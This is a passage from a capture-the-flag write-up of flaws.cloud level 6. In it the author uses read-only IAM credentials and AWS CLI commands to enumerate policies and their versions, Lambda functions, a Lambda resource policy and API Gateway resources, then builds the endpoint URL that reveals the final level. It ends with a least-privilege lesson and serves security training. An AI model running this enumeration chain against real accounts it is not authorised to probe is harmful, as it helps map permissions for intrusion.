            "UserId": "AIDAIRMDOSCWGLCDWOG6A",
            "Arn": "arn:aws:iam::975426262029:user/Level6",
            "CreateDate": "2017-02-26T23:11:16+00:00"
        }
    ]
```

We need to find out which policies are attached to the IAM user. `list-attached-user-policies` will do that for us.

```ps
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 iam list-attached-user-policies --user-name level6
{
    "AttachedPolicies": [
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        },
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        }
    ]
}
```

Interesting. So a modified `SecurityAudit` policy is attached to this user. And there is another policy `list_apigateways` attached. Sounds like it has something to do with **API GATEWAY**.

Amazon API Gateway is a fully managed service to create, publish, maintain, monitor, and secure APIs at scale. It supports RESTful APIs and WebSocket APIs.

Let's get more information about the policy

```ps
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
{
    "Policy": {
        "PolicyName": "list_apigateways",
        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "List apigateways",
        "CreateDate": "2017-02-20T01:45:17+00:00",
        "UpdateDate": "2017-02-20T01:48:17+00:00",
        "Tags": []
    }
}
```

Great now we know the policy `arn` and the default version `v4`. At first i thought `get-policy` will retrieve the contents of the policy, but i was wrong. Policies in AWS are **versioned**. We need to specify the version we want to retrieve.

`get-policy-version` will retrieve a policy by its `arn` and `version`.


```ps
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17+00:00"
    }
}
```

Great! now we know this IAM user is allowed to perform GET operations on the REST aPIs in the `/restapis/*` endpoints.

We can list the users or roles this policy is attached to using the `list-entities-for-policy` command:

```ps
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 iam list-entities-for-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
{
    "PolicyGroups": [],
    "PolicyUsers": [
        {
            "UserName": "Level6",
            "UserId": "AIDAIRMDOSCWGLCDWOG6A"
        }
    ],
    "PolicyRoles": []
}

PS C:\Users\Ahmed\flaws\level6> aws --profile level6 sts get-caller-identity
{
    "UserId": "AIDAIRMDOSCWGLCDWOG6A",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/Level6"
}
```

The policy is attached to the IAM user we currently using `Level6`. 

Before we go somewhere else, Let's check out the previous versions, and leave no stone unturned.

Here are the past versions of the policy:

```ps
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 iam get-policy-version --version-id v1 --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --no-cli-pager
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:execute-api:us-west-2:975426262029:puspzvwgb6/*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2017-02-20T01:45:17+00:00"
    }
}                               aws --profile level6 --region us-west-2 iam get-policy-version --version-id v2 --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --no-cli-pager
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-east-1::/restapis/*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": false,
        "CreateDate": "2017-02-20T01:46:41+00:00"
    }
}
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 iam get-policy-version --version-id v3 --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --no-cli-pager
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/puspzvwgb6/stages"
                }
            ]
        },
        "VersionId": "v3",
        "IsDefaultVersion": false,
        "CreateDate": "2017-02-20T01:47:11+00:00"
    }
}
```

Every attempt to enumerate the API Gateway doesn't work, so I'm starting to feel this isn't the intended way. API Gateway is... well a gateway to probably a Lambda function.

Let's list lambda functions in this account:

```ps
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2017-02-27T00:24:36.054+0000",
            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "d45cc6d9-f172-4634-8d19-39a20951d979",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/Level6"
            }
        }
    ]
}
```

So there is a Lambda function `Level6` running. Let's try and get that function and see what it does.

```ps
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 lambda get-function --function-name Level6

An error occurred (AccessDeniedException) when calling the GetFunction operation: User: arn:aws:iam::975426262029:user/Level6 is not authorized to perform: lambda:GetFunction on resource: arn:aws:lambda:us-west-2:975426262029:function:Level6 because no identity-based policy allows the lambda:GetFunction action
```

Okay. Let's see what actions we can perform.

```ps
PS C:\Users\Ahmed\flaws\level6> cat .\MySecurityAudit.policy | findstr lambda
                        "lambda:GetAccountSettings",
                        "lambda:GetPolicy",
                        "lambda:List*",
```

`get-policy` is used to find out who has permissions to invoke the Lambda function:

```json
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 lambda get-policy --function-name Level6 | jq '. | .Policy |= fromjson | .'
{
  "Policy": {
    "Version": "2012-10-17",
    "Id": "default",
    "Statement": [
      {
        "Sid": "904610a93f593b76ad66ed6ed82c0a8b",
        "Effect": "Allow",
        "Principal": {
          "Service": "apigateway.amazonaws.com"
        },
        "Action": "lambda:InvokeFunction",
        "Resource": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
        "Condition": {
          "ArnLike": {
            "AWS:SourceArn": "arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6"
          }
        }
      }
    ]
  },
  "RevisionId": "edaca849-06fb-4495-a09c-3bc6115d3b87"
}
```

According to the [docs](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-control-access-using-iam-policies-to-invoke-api.html), `GET` requests to the `level6` endpoint are allowed to invoke the lambda function.

```json
"Resource": [
        "arn:aws:execute-api:region:account-id:api-id/stage/METHOD_HTTP_VERB/Resource-path"
      ]
```

And now we know the `API ID` `s33ppypa75`. Let's enumerate it. `get-rest-api` gives us an overview of the REST API.

```ps
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 apigateway get-rest-api --rest-api-id s33ppypa75
{
    "id": "s33ppypa75",
    "name": "Level6",
    "createdDate": "2017-02-27T01:21:35+01:00",
    "apiKeySource": "HEADER",
    "endpointConfiguration": {
        "types": [
            "EDGE"
        ]
    },
    "tags": {},
    "disableExecuteApiEndpoint": false,
    "rootResourceId": "y8nk5v2z1h"
}
```

What stages are available in this API endpoint? `get-stages` will tell us:

```ps
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 apigateway get-stages --rest-api-id s33ppypa75                                                                                                  {
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": "2017-02-27T01:26:08+01:00",
            "lastUpdatedDate": "2017-02-27T01:26:08+01:00"
        }
    ]
}
```

Alright `Prod` is the only stage in the API. Next let's list the API Endpoints of the `level6` API using the `get-resources` command:

```ps
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 apigateway get-resources --rest-api-id s33ppypa75
{
    "items": [
        {
            "id": "6m5gni",
            "parentId": "y8nk5v2z1h",
            "pathPart": "level6",
            "path": "/level6",
            "resourceMethods": {
                "GET": {}
            }
        },
        {
            "id": "y8nk5v2z1h",
            "path": "/"
        }
    ]
}
```

So the API has a `/level6` endpoint AKA resource.

Lastly according to this [documentation Invoke REST APIs in API Gateway](https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-call-api.html), we can invoke a REST API endpoint using the following format:


![](assets/flaws_level_6_invoke_api.png)

```
https://api-id.execute-api.region.amazonaws.com/stage/
```

- `api-id`: `s33ppypa75`
- `region`:`us-west-2` 
- `stage`: `Prod`
- Endpoint: `/level6`

```
https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
```

```json
"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"
```

![](assets/flaws_level_6_api_response.png)


Thinking that only write permissions are the ones that we should be careful in giving is wrong, because read permissions can be as dangerous. 

In this level we used the security audit read permissions to enumerate the policies attached to the IAM user to find out that there is a policy that gives the user API Gateway permissions on all REST APIs. Usually API Gateway REST APIs invoke lambda functions, so we enumerated lambda functions to find that there is a `Level6` lambda function. Next we retrieved the policy attached to the lambda function where we learned the API ID `s33ppypa75`. We used the API ID to list the stages of the API and the API endpoints of the REST API. `Prod` is the only stage available, and `/level6` is the only API endpoint available. We used the API ID, region, stage, and API endpoint to construct the URL to invoke the lambda function. The lambda function returns the final level URL.

Lesson learned: Apply the least privilege with read permissions as you do with write permissions.


Finally! We are done with the challenges.

```
http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/
```

![](assets/flaws_end_site.png)

